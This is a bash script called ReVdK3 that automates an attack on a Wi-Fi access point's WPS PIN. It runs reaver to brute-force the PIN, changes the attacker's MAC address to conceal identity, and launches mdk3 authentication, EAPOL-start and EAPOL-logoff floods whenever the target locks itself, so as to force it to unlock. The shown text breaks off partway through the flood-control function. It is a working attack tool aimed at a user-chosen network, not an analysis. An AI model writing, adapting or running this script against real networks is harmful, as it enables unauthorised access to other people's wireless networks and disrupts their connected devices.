#!/bin/bash
declare MAC;
declare PIN_TIME;
declare WLAN;
declare MON1;
declare MON2;
declare MON3;
declare PHY_OF_WLAN_1;
declare NO_OF_MONITOR_INTERFACES_CHECK;
declare MONITOR_INTERFACES;
declare STOP_INTERFACE;
declare VARIABLE;
declare CHANNEL;
declare DISTANCE_BETWEEN_PINS;
declare TIMEOUT;
declare ESSID;
declare SATISFIED_OPTION=r;
declare REAVER_COMMAND_LINE;
declare MDK3_MAIN_MENU_OPTION;
declare RETURN_OPTION_FOR_AUTH_DOS_FOR_AUTH_DOS;
declare RETURN_OPTION_FOR_EAPOL_START_FLOOD;
declare EAPOL_START_FLOOD_COMMAND;
declare AUTH_DOS_FLOOD_COMMAND;
declare RETURN_OPTION_FOR_EAPOL_LOG_OFF_FLOOD;
declare EAPOL_LOG_OFF_FLOOD_COMMAND;
declare VARIABLE_CHECK_FOR_RATE_LIMITING;
declare TARGET_STATION;
declare MDK3_KILLALL_1
declare AIREPLAY_KILLALL;
declare SUCCESSIVE_EAPOL_FAILURES;
declare AIREPLAY_RESET;
declare MONITOR_INTERFACES_CHECK;

#WELCOM MESSAGE
echo -e "\e[36m\e[1m###########################\e[0m";
echo -e "\e[36m\e[1m# WELCOME TO ReVdK3 Script#  \e[35m\e[1mC\e[92m\e[1mR\e[91m\e[1mE\e[34m\e[1mA\e[33m\e[1mT\e[96m\e[1mE\e[35m\e[1mD  \e[92m\e[1mB\e[35m\e[1mY\e[0m : \e[35m\e[1mR\e[92m\e[1mE\e[91m\e[1mP\e[34m\e[1mZ\e[33m\e[1mE\e[96m\e[1mR\e[35m\e[1mO\e[92m\e[1mW\e[91m\e[1mO\e[34m\e[1mR\e[33m\e[1mL\e[96m\e[1mD\e[35m\e[1m\e[0m";
echo -e "\e[36m\e[1m###########################\e[0m";
echo -e "\e[36m\e[1m#####################################################################\e[0m";
echo -e "\e[36m\e[1m# This Script allows you to use reaver and an mdk3 flood attack that#\e[0m";
echo -e "\e[36m\e[1m# you choose                                                        #\e[0m"; 
echo -e "\e[36m\e[1m#####################################################################\e[0m";
echo -e "\e[36m\e[1m# This Script was created for Access Points that locks up for long  #\e[0m";
echo -e "\e[36m\e[1m# periods of time. It works by starting reaver and continously      #\e[0m";
echo -e "\e[36m\e[1m# detect when reaver is rate limiting pins, once reaver detects     #\e[0m";
echo -e "\e[36m\e[1m# the AP is rate limiting pins, it starts mdk3 attacks. mdk3 attacks#\e[0m";
echo -e "\e[36m\e[1m# are killed once reaver detects that the AP has unlocked itself !  #\e[0m";
echo -e "\e[36m\e[1m# The prcoess goes on...                                            #\e[0m";
echo -e "\e[36m\e[1m#####################################################################\e[0m";
echo ;
echo  -e "\e[37m\e[44m\e[1m ReVdK3.sh-r1 (Revision 1)- see README\e[0m";
echo ;
echo -e "\e[37m\e[44m\e[1mThanks to N1ksan for some useful ideas in this revision!\e[0m";
echo ;
echo -e	"\e[36m\e[40m\e[1m******************************************************\e[0m";
echo -e "\e[36m\e[40m\e[1m* Welcome: I need to verify your wireless interface  *\e[0m";
echo -e	"\e[36m\e[40m\e[1m******************************************************\e[0m";
echo ; 
read -p "Which wireless interface you will be using? e.g wlan1, wlan2 etc": WLAN; 
EXISTENCE_OF_WLAN=`airmon-ng|grep ''"$WLAN"|cut -f1`;
while [   -z "$WLAN" -o "$EXISTENCE_OF_WLAN" != "$WLAN" ]; do
echo -e "\e[31m\e[1mYou input a wireless interface that doesn't exist!\e[0m";
echo ;
read -p "Which wireless interface you will be using? e.g wlan1, wlan2 etc": WLAN; 
EXISTENCE_OF_WLAN=`airmon-ng|grep ''"$WLAN"|cut -f1`;
done
PHY_OF_WLAN_1=`airmon-ng|grep $WLAN|cut -d ' ' -f4`;
NO_OF_MONITOR_INTERFACES_CHECK=`airmon-ng|grep -F "$PHY_OF_WLAN_1"|wc -l`;
MONITOR_INTERFACES=`airmon-ng|grep -F "$PHY_OF_WLAN_1"|cut -f1|tr -s [:space:] ' '`;
echo -e "\e[36m\e[1mKilling any existing monitor interface(s) on $WLAN\e[0m";
if [ "$NO_OF_MONITOR_INTERFACES_CHECK" != 1 ]; then
for STOP_INTERFACE in $MONITOR_INTERFACES; do
if [ "$STOP_INTERFACE" != "$WLAN"  ]; then
airmon-ng stop $STOP_INTERFACE > /dev/null;
fi   
done
fi
echo -e "\e[36m\e[1mSuccessful!\e[0m";
echo -e "\e[36m\e[1mStarting three new monitor modes...\e[0m";
MON1=`airmon-ng start $WLAN|grep -F '(monitor mode enabled on '|tr -s [:space:] ' '|cut -d ' ' -f6|tr -d ')'`
MON2=`airmon-ng start $WLAN|grep -F '(monitor mode enabled on '|tr -s [:space:] ' '|cut -d ' ' -f6|tr -d ')'`
MON3=`airmon-ng start $WLAN|grep -F '(monitor mode enabled on '|tr -s [:space:] ' '|cut -d ' ' -f6|tr -d ')'`
echo "Successful!"
trap 'echo -e "\n\e[36m\e[1mCleaning up all temporary files created by this script..good house keeping...ensuring all processes are killed!\e[31m\e[0m"; killall mdk3 2> /dev/null; killall reaver 2> /dev/null; killall tail 2> /dev/null; rm -f /etc/reaver_tmp.txt 2> /dev/null; airmon-ng stop "$MON1" > /dev/null; airmon-ng stop "$MON2" > /dev/null; airmon-ng stop "$MON3" > /dev/null; killall aireplay-ng 2> /dev/null; rm -f /etc/aireplay_tmp.txt 2> /dev/null; killall -9 ReVdK3-r1.sh > /dev/null; '  SIGINT SIGHUP 
clear
while [ "$SATISFIED_OPTION" = r  ]; do
clear
echo ;
echo -e "\e[36m\e[40m\e[1m***********************************\e[0m";
echo -e "\e[36m\e[40m\e[1m*Welcome to Reaver's configuration*\e[0m";
echo -e "\e[36m\e[40m\e[1m***********************************\e[0m";
echo ;
echo -e "\e[36m\e[40m\e[1mxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\e[0m";
echo -e "\e[36m\e[40m\e[1mx        MAC ADDRESS OF AP              x\e[0m";
echo -e "\e[36m\e[40m\e[1mxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\e[0m";
echo ;
read -p "What is the mac address of the access point you are targeting?": MAC;
while [ -z "$MAC" ]; do
echo -e "\e[31m\e[1mYou need to input the target's MAC address\e[0m";
echo ;
read -p "What is the mac address of the access point you are targeting?": MAC;
done
echo "MAC address saved...";
echo ;
echo -e "\e[36m\e[40m\e[1mxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\e[0m";
echo -e "\e[36m\e[40m\e[1mx        ESSID OF AP                    x\e[0m";
echo -e "\e[36m\e[40m\e[1mxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\e[0m";
echo ;
read -p "What is the essid of the access point you are targeting": ESSID;
while [ -z "$ESSID" ]; do
echo -e "\e[31m\e[1mYou need to input the target's ESSID when running aireplay-ng &/or running mdk3 eapol start flood attacks!\e[0m";
echo ;
read -p "What is the essid of the access point you are targeting": ESSID;
done
echo "ESSID saved...";
echo -e "\e[36m\e[1mI am hiding your identity by changing your mac\e[0m";
sleep 2;
ifconfig $WLAN down;
ifconfig $WLAN down;
ifconfig $WLAN down;
ifconfig $MON1 down;
ifconfig $MON1 down;
ifconfig $MON2 down;
ifconfig $MON2 down;
ifconfig $MON3 down;
ifconfig $MON3 down;
macchanger -m '78:03:40:02:94:8f' "$WLAN"> /dev/null;
macchanger -m '78:03:40:02:94:8f' "$MON1"> /dev/null;
macchanger -m '78:03:40:02:94:8f' "$MON2"> /dev/null;
macchanger -m '78:03:40:02:94:8f' "$MON3"> /dev/null;
ifconfig $MON1 up;
ifconfig $MON1 up;
ifconfig $MON2 up;
ifconfig $MON2 up;
ifconfig $MON3 up;
ifconfig $MON3 up;
echo;
echo ;
echo -e "\e[36m\e[40m\e[1mxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\e[0m";
echo -e "\e[36m\e[40m\e[1mx                              Reaver's Options                              x\e[0m";
echo -e "\e[36m\e[40m\e[1mxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\e[0m";
echo -e "\e[36m\e[40m\e[1mx                                                                            x\e[0m";
echo -e "\e[36m\e[40m\e[1mx[1] Channel Option (-c)                                                     x\e[0m";
echo -e "\e[36m\e[40m\e[1mx(note: Some Access Point hop to another channel when they reboot!           x\e[0m";
echo -e "\e[36m\e[40m\e[1mx............................................................................x\e[0m";
echo -e "\e[36m\e[40m\e[1mx[2] Timeout Option (-t)                                                     x\e[0m";
echo -e "\e[36m\e[40m\e[1mx(Reaver's to wait for a message from the AP)                                x\e[0m";
echo -e "\e[36m\e[40m\e[1mx............................................................................x\e[0m";
echo -e "\e[36m\e[40m\e[1mx[3] Reaver's time between pin (-d)                                          x\e[0m"; 
echo -e "\e[36m\e[40m\e[1mx                                                                            x\e[0m";
echo -e "\e[36m\e[40m\e[1mxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\e[0m";
echo ;
#CHANNEL CHAIN
echo -e "\e[36m\e[40m\e[1mxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\e[0m";
echo -e "\e[36m\e[40m\e[1mx        CHANNEL SWITCH                 x\e[0m";
echo -e "\e[36m\e[40m\e[1mxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\e[0m";
echo ;
read -p "What channel you want reaver listen on (-c flag), or press ENTER to use default reaver's option": CHANNEL;
while [[ "$CHANNEL" != @(1|2|3|4|5|6|7|8|9|10|11|12|13|14|15|16|)  ]]; do
echo -e "\e[31m\e[1mYou need to input a channel number between 1-16\e[0m";
echo ;
read -p "What channel you want reaver listen on (-c flag), or press ENTER to use default reaver's option": CHANNEL;
done
#DISTANCE BETWEEN PIN ATTEMPTS CHAIN
echo ;
echo -e "\e[36m\e[40m\e[1mxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\e[0m";
echo -e "\e[36m\e[40m\e[1mx        PIN DELAY SWITCH               x\e[0m";
echo -e "\e[36m\e[40m\e[1mxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\e[0m";
echo ;
read -p  "How much time in seconds for distance between pin attempts? (-d flag), if you want to use default option press ENTER ": DISTANCE_BETWEEN_PINS
while [[  $DISTANCE_BETWEEN_PINS = ["-"A-Za-qs-z'`''~''@''#''$''%''^''&''*''('')''_''+''=''|''['']''{''}''\'"'"'"'';'':'',''.''<''>''/''?'' *''0']*  ]]; do 
echo -e "\e[31m\e[1mYou need to choose a postive number!\e[0m";
echo ;
read -p  "How much time in seconds for distance between pin attempts? (-d flag), if you want to use default option press ENTER ": DISTANCE_BETWEEN_PINS
done
#TIME OUT CHAIN
echo -e "\e[36m\e[40m\e[1mxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\e[0m";
echo -e "\e[36m\e[40m\e[1mx        TIMEOUT SWITCH                 x\e[0m";
echo -e "\e[36m\e[40m\e[1mxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\e[0m";
echo ;
read -p "How much time in seconds for reaver to timeout if the AP doesn't respond? (-t flag), if you want to use default option press ENTER": TIMEOUT;
while [[  $TIMEOUT = ["-"A-Za-qs-z'`''~''@''#''$''%''^''&''*''('')''_''+''=''|''['']''{''}''\'"'"'"'';'':'',''.''<''>''/''?'' *''0']*  ]]; do 
echo -e "\e[31m\e[1mYou need to choose a postive number!\e[0m";
echo ;
read -p "How much time in seconds for reaver to timeout if the AP doesn't respond? (-t flag), if you want to use default 
option press ENTER": TIMEOUT;
echo ;
done
echo ;
echo -e "\e[36m\e[40m\e[1mxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\e[0m";
echo -e "\e[36m\e[40m\e[1mx    REAVER COMMAND LINE YOU HAVE CHOOSEN     x\e[0m";
echo -e "\e[36m\e[40m\e[1mxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\e[0m";
echo ;

if [ -z "$CHANNEL" -a -n "$DISTANCE_BETWEEN_PINS" -a "$TIMEOUT" ]; then 
echo "reaver -i $MON1 -b $MAC -S -d $DISTANCE_BETWEEN_PINS -t $TIMEOUT -l 10 -N -vv";
REAVER_COMMAND_LINE=`echo "reaver -i $MON1 -b $MAC -S -d $DISTANCE_BETWEEN_PINS -t $TIMEOUT -l 10 -N -vv"`;
echo ;
fi
if [ -z "$DISTANCE_BETWEEN_PINS" -a -n "$CHANNEL" -a -n "$TIMEOUT" ]; then
echo "reaver -i $MON1 -b $MAC -S -c $CHANNEL -t $TIMEOUT -l 10 -N -vv";
REAVER_COMMAND_LINE=`echo "reaver -i $MON1 -b $MAC -S -c $CHANNEL -t $TIMEOUT -l 10 -N -vv"`;
echo;
fi
if [ -z "$TIMEOUT" -a -n "$DISTANCE_BETWEEN_PINS" -a -n "$CHANNEL" ]; then
echo "reaver -i $MON1 -b $MAC -S -c $CHANNEL -d $DISTANCE_BETWEEN_PINS -l 10 -N -vv";
REAVER_COMMAND_LINE=`echo "reaver -i $MON1 -b $MAC -S -c $CHANNEL -d $DISTANCE_BETWEEN_PINS -l 10 -N -vv"`;
echo ;
fi
if [ -z "$CHANNEL" -a -z "$DISTANCE_BETWEEN_PINS" -a -n "$TIMEOUT" ]; then
echo "reaver -i $MON1 -b $MAC -S -t $TIMEOUT -l 10 -N -vv";
REAVER_COMMAND_LINE=`echo "reaver -i $MON1 -b $MAC -S -t "$TIMEOUT" -l 10 -N -vv"`;
echo ;
fi
if [ -z "$CHANNEL" -a -z "$TIMEOUT" -a -n "$DISTANCE_BETWEEN_PINS" ]; then
echo "reaver -i $MON1 -b $MAC -S -d $DISTANCE_BETWEEN_PINS -l 10  -N -vv";
REAVER_COMMAND_LINE=`echo "reaver -i $MON1 -b $MAC -S -d $DISTANCE_BETWEEN_PINS -l 10 -N -vv"`;
echo ;
fi
if [ -z "$DISTANCE_BETWEEN_PINS" -a -z "$TIMEOUT" -a -n "$CHANNEL" ]; then
echo "reaver -i $MON1 -b $MAC -S -c $CHANNEL -l 10 -N -vv";
REAVER_COMMAND_LINE=`echo "reaver -i $MON1 -b $MAC -S -c $CHANNEL -l 10 -N -vv"`;
echo ;
fi
if [ -z "$DISTANCE_BETWEEN_PINS" -a -z "$TIMEOUT" -a -z "$CHANNEL" ]; then
echo "reaver -i $MON1 -b $MAC -S -l 10 -N -vv";
REAVER_COMMAND_LINE=`echo "reaver -i $MON1 -b $MAC -S -l 10 -N -vv"`;
fi
if [ -n "$DISTANCE_BETWEEN_PINS" -a -n "$TIMEOUT" -a -n "$CHANNEL" ]; then
echo "reaver -i $MON1 -b $MAC -S -c $CHANNEL -d $DISTANCE_BETWEEN_PINS -t $TIMEOUT -l 10 -N -vv";
REAVER_COMMAND_LINE=`echo "reaver -i $MON1 -b $MAC -S -c $CHANNEL -d $DISTANCE_BETWEEN_PINS -t $TIMEOUT -l 10 -N -vv"`;
echo ;
fi
echo ;
read -p "Are you satisified with this configuration? if not,  input 'r' and you will be returned to Reaver's Configuration Wizard": SATISFIED_OPTION;
done
if [ -e /etc/reaver_tmp.txt ]; then
rm -f /etc/reaver_tmp.txt
fi
if [ -e /etc/aireplay_tmp.txt ]; then
rm -f /etc/aireplay_tmp.txt
fi
clear
function MDK3_MAIN_MENU {
echo -e "\e[36m\e[40m\e[1mxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\e[0m";
echo -e "\e[36m\e[40m\e[1mx                  WELCOME TO MDK3 FLOOD ATTACK MAIN MENU                    x\e[0m";
echo -e "\e[36m\e[40m\e[1mxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\e[0m";
echo -e "\e[36m\e[40m\e[1mx[1] Authentication DoS Flood Attack                                         x\e[0m";
echo -e "\e[36m\e[40m\e[1mxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\e[0m";
echo -e "\e[36m\e[40m\e[1mx[2] EAPOL Start Flood Attack                                                x\e[0m";
echo -e "\e[36m\e[40m\e[1mxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\e[0m";
echo -e "\e[36m\e[40m\e[1mx[3] EAPOL log off Flood Attack                                              x\e[0m"; 
echo -e "\e[36m\e[40m\e[1mxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\e[0m";
echo -e "\e[36m\e[40m\e[1mx NOTE:This script will stop reaver once it detects the AP is locked and     x\e[0m";
echo -e "\e[36m\e[40m\e[1mx then flood the Access Point for the time period you choose after flooding  x\e[0m";
echo -e "\e[36m\e[40m\e[1mx reaver resumes.This process goes on until reaver finds the correct pin!    x\e[0m";
echo -e "\e[36m\e[40m\e[1mxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\e[0m";
echo ;
read -p "Which Attack You Prefer to carry out(Input No.)?": MDK3_MAIN_MENU_OPTION;
while [[ "$MDK3_MAIN_MENU_OPTION" != @(1|2|3) ]]; do
echo -e "\e[31m\e[1mIncorrect Option choosen, Please choose an option from the Main Menu!\e[0m"; 
echo ;
read -p "Which Attack You Prefer to carry out(Input No.)?": MDK3_MAIN_MENU_OPTION;
done;
if [  "$MDK3_MAIN_MENU_OPTION" = 1  ]; then
clear
AUTH_DOS_MAIN_MENU;
fi
if [  "$MDK3_MAIN_MENU_OPTION" = 2  ]; then
clear
EAPOL_START_FLOOD_ATTACK_MAIN_MENU;
fi
if [  "$MDK3_MAIN_MENU_OPTION" = 3  ]; then
clear
EAPOL_LOG_OFF_ATTACK_MAIN_MENU; 
fi
}
###########################################################################
function AUTH_DOS_MAIN_MENU {
echo -e "\e[36m\e[40m\e[1mxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\e[0m";
echo -e "\e[36m\e[40m\e[1mx                  Authentication DoS Flood Attack                           x\e[0m";
echo -e "\e[36m\e[40m\e[1mxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\e[0m";
echo -e "\e[36m\e[40m\e[1mxNOTE:This Attack will start flooding the AP with numerous fake clients      x\e[0m";
echo -e "\e[36m\e[40m\e[1mxuntil reaver detects that the AP is unlocked. The attack will restart when  x\e[0m";
echo -e "\e[36m\e[40m\e[1mxthe AP has locked itself again...the process goes on!                       x\e[0m";
echo -e "\e[36m\e[40m\e[1mxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\e[0m";
echo ;
echo -e "\e[36m\e[40m\e[1mxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\e[0m";
echo -e "\e[36m\e[40m\e[1mxThe Authentication DoS Flood Command line below will be used     x\e[0m";
echo -e "\e[36m\e[40m\e[1mxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\e[0m";
echo ;
AUTH_DOS_FLOOD_COMMAND=`echo -e "\e[36m\e[1mmdk3 $MON1 a -a $MAC -s 200 & mdk3 $MON2 a -a $MAC -s 200 & mdk3 "$MON3" a -a $MAC -s 200\e[0m"`;
echo "$AUTH_DOS_FLOOD_COMMAND";
echo ;
read -p "To start the attack press ENTER  to proceed or input 'r' to return to mdk3 main menu": RETURN_OPTION_FOR_AUTH_DOS_FOR_AUTH_DOS 
if [  "$RETURN_OPTION_FOR_AUTH_DOS_FOR_AUTH_DOS" = r ]; then
clear
MDK3_MAIN_MENU
fi
echo -e "\e[36m\e[1mStarting MDK3 Auth Flood Attack...\e[0m"
sleep 3;
clear
REAVER & AIREPLAY & MDK3 & TAIL;
}
###########################################################################
function EAPOL_START_FLOOD_ATTACK_MAIN_MENU {
echo -e "\e[36m\e[40m\e[1mxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\e[0m";
echo -e "\e[36m\e[40m\e[1mx                  EAPOL Start Flood Attack                                  x\e[0m";
echo -e "\e[36m\e[40m\e[1mxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\e[0m";
echo -e "\e[36m\e[40m\e[1mxNOTE:This Attack will start flooding the AP with numerous EAPOL start       x\e[0m";
echo -e "\e[36m\e[40m\e[1mxpackets until reaver detects that the AP is unlocked. The attack will       x\e[0m";
echo -e "\e[36m\e[40m\e[1mxrestart when the AP has locked itself again...the process goes on!          x\e[0m";
echo -e "\e[36m\e[40m\e[1mxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\e[0m";
echo;
echo -e "\e[36m\e[40m\e[1mxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\e[0m";
echo -e "\e[36m\e[40m\e[1mxThe Authentication EAPOL Start Flood Attack Command line below will be usedx\e[0m";
echo -e "\e[36m\e[40m\e[1mxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\e[0m";
echo ;
EAPOL_START_FLOOD_COMMAND=`echo -e "\e[36m\e[1mmdk3 $MON1 x 0 -t $MAC -n $ESSID -s 200 & mdk3 $MON2 x 0 -t $MAC -n $ESSID -s 200 & mdk3 $MON3 x 0 -t $MAC -n $ESSID -s 200\e[0m"`;
echo "$EAPOL_START_FLOOD_COMMAND";
read -p "To start the attack press ENTER  to proceed or input 'r' to return to mdk3 main menu": RETURN_OPTION_FOR_EAPOL_START_FLOOD; 
if [  "$RETURN_OPTION_FOR_EAPOL_START_FLOOD" = r ]; then
clear
MDK3_MAIN_MENU;
fi
echo -e "\e[36m\e[1mStarting MDK3 EAPOL Start Flood Attack...\e[0m";
sleep 3;
clear
REAVER & AIREPLAY & MDK3 & TAIL;
}
###########################################################################
function EAPOL_LOG_OFF_ATTACK_MAIN_MENU {
echo -e "\e[36m\e[40m\e[1mxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\e[0m";
echo -e "\e[36m\e[40m\e[1mx                  EAPOL Log Off Flood Attack                                x\e[0m";
echo -e "\e[36m\e[40m\e[1mxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\e[0m";
echo -e "\e[36m\e[40m\e[1mxNOTE:This Attack will start flooding the AP with numerous EAPOL log off     x\e[0m";
echo -e "\e[36m\e[40m\e[1mxpackets until reaver detects that the AP is unlocked. The attack will       x\e[0m";
echo -e "\e[36m\e[40m\e[1mxrestart when the AP has locked itself again...the process goes on!          x\e[0m";
echo -e "\e[36m\e[40m\e[1mxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\e[0m";
echo;
read -p "What is the MAC address of one of the client's connected?": TARGET_STATION
while [[ "$TARGET_STATION" = @(|) ]]; do
echo -e "\e[31m\e[1mYou cannot leave this field blank\e[0m";
echo
read -p "What is the MAC address of one of the client connected?": TARGET_STATION
done
echo -e "\e[36m\e[40m\e[1mxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\e[0m";
echo -e "\e[36m\e[40m\e[1mxThe Authentication EAPOL Log Off Flood Attack Command line below will be usedx\e[0m";
echo -e "\e[36m\e[40m\e[1mxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\e[0m";
echo ;
EAPOL_LOG_OFF_FLOOD_COMMAND=`echo -e "\e[36m\e[1mmdk3 $MON1 x 1 -t $MAC  -s 200 -c $TARGET_STATION & mdk3 $MON2 x 1 -t $MAC -s 200 -c $TARGET_STATION & mdk3 $MON3 x 1 -t $MAC -s 200 -c $TARGET_STATION\e[0m"`;
echo "$EAPOL_LOG_OFF_FLOOD_COMMAND";
read -p "To start the attack press ENTER  to proceed or input 'r' to return to mdk3 main menu": RETURN_OPTION_FOR_EAPOL_LOG_OFF_FLOOD; 
if [  "$RETURN_OPTION_FOR_EAPOL_LOG_OFF_FLOOD" = r ]; then
clear
MDK3_MAIN_MENU;
fi
echo -e "\e[36m\e[1mStarting MDK3 EAPOL Log Off Flood Attack...\e[0m";
sleep 3;
clear;
REAVER & AIREPLAY & MDK3 & TAIL;
}
##########################################################################
function REAVER {	
echo y|$REAVER_COMMAND_LINE|tee -a /etc/reaver_tmp.txt > /dev/null & aireplay-ng $MON1 -1 100000000 -a "$MAC" -e "$ESSID" -Q -q3 2> /dev/null| tee /etc/aireplay_tmp.txt > /dev/null;
}
###########################################################################
function MDK3 {
while :; do
MDK3_KILLALL_1=`ps -A|grep mdk3`
VARIABLE_CHECK_FOR_RATE_LIMITING=`tail -1 /etc/reaver_tmp.txt 2> /dev/null`;
SUCCESSIVE_EAPOL_FAILURES=`tail -4 /etc/reaver_tmp.txt 2> /dev/null|grep -F '[!] WARNING: 25 successive start failures'`;
while [ "$VARIABLE_CHECK_FOR_RATE_LIMITING" = "[!] WARNING: Detected AP rate limiting, waiting 10 seconds before re-checking" -a -z "$MDK3_KILLALL_1"  ]; do
if [ "$MDK3_MAIN_MENU_OPTION" = 1 ]; then
gnome-terminal --geometry=1x2 --title='Authentication Dos Flood Attack in progess' -e  "mdk3 $MON1 a -a $MAC -s 200" & gnome-terminal --geometry=1x2 --title='Authentication Dos Flood Attack in progess' -e  "mdk3 $MON2 a -a $MAC -s 200" & gnome-terminal -e --geometry=1x2 --title='Authentication Dos Flood Attack in progess' -e "mdk3 $MON3 a -a $MAC -s 200";
sleep 0.5;
fi
if [ "$MDK3_MAIN_MENU_OPTION" = 2 ]; then
gnome-terminal  --geometry=1x2 --title='EAPOL Start Flood Attack in progress' -e "mdk3 $MON1 x 0 -t $MAC -n "$ESSID" -s 200" &  gnome-terminal  --geometry=1x2 --title='EAPOL Start Flood Attack in progress' -e "mdk3 $MON2 x 0 -t $MAC -n "$ESSID" -s 200" &  gnome-terminal  --geometry=1x2 --title='EAPOL Start Flood Attack in progress' -e "mdk3 $MON3 x 0 -t $MAC -n "$ESSID" -s 200";
sleep 0.5;
fi
if [ "$MDK3_MAIN_MENU_OPTION" = 3 ]; then
gnome-terminal  --geometry=1x2 --title='EAPOL log off Flood Attack in progress' -e "mdk3 $MON1 x 1 -t $MAC  -s 200 -c $TARGET_STATION" & gnome-terminal  --geometry=1x2 --title='EAPOL log off Flood Attack in progress' -e "mdk3 $MON2 x 1 -t $MAC -s 200 -c $TARGET_STATION" & gnome-terminal  --geometry=1x2 --title='EAPOL log off Flood Attack in progress' -e  "mdk3 $MON3 x 1 -t $MAC -s 200 -c $TARGET_STATION";
sleep 0.5;
fi
MDK3_KILLALL_1=`ps -A|grep mdk3`
VARIABLE_CHECK_FOR_RATE_LIMITING=`tail -1 /etc/reaver_tmp.txt 2> /dev/null`;
SUCCESSIVE_EAPOL_FAILURES=`tail -4 /etc/reaver_tmp.txt 2> /dev/null|grep -F '[!] WARNING: 25 successive start failures'`;
done
###
while [ "$SUCCESSIVE_EAPOL_FAILURES" = "[!] WARNING: 25 successive start failures" -a -z "$MDK3_KILLALL_1" ]; do
killall -STOP reaver
echo -e "\e[36m\e[1mReaver detected 25 successive eapol failures!, pausing reaver and running flood attacks for 60 second!\e[0m" >> /etc/reaver_tmp.txt ;
if [ "$MDK3_MAIN_MENU_OPTION" = 1 ]; then
gnome-terminal --geometry=1x2 --title='Authentication Dos Flood Attack in progess' -e  "timeout 60 mdk3 $MON1 a -a $MAC -s 200" & gnome-terminal --geometry=1x2 --title='Authentication Dos Flood Attack in progess' -e  "timeout 60 mdk3 $MON2 a -a $MAC -s 200" & gnome-terminal -e --geometry=1x2 --title='Authentication Dos Flood Attack in progess' -e "timeout 60 mdk3 $MON3 a -a $MAC -s 200";
sleep 60;
fi
if [ "$MDK3_MAIN_MENU_OPTION" = 2 ]; then
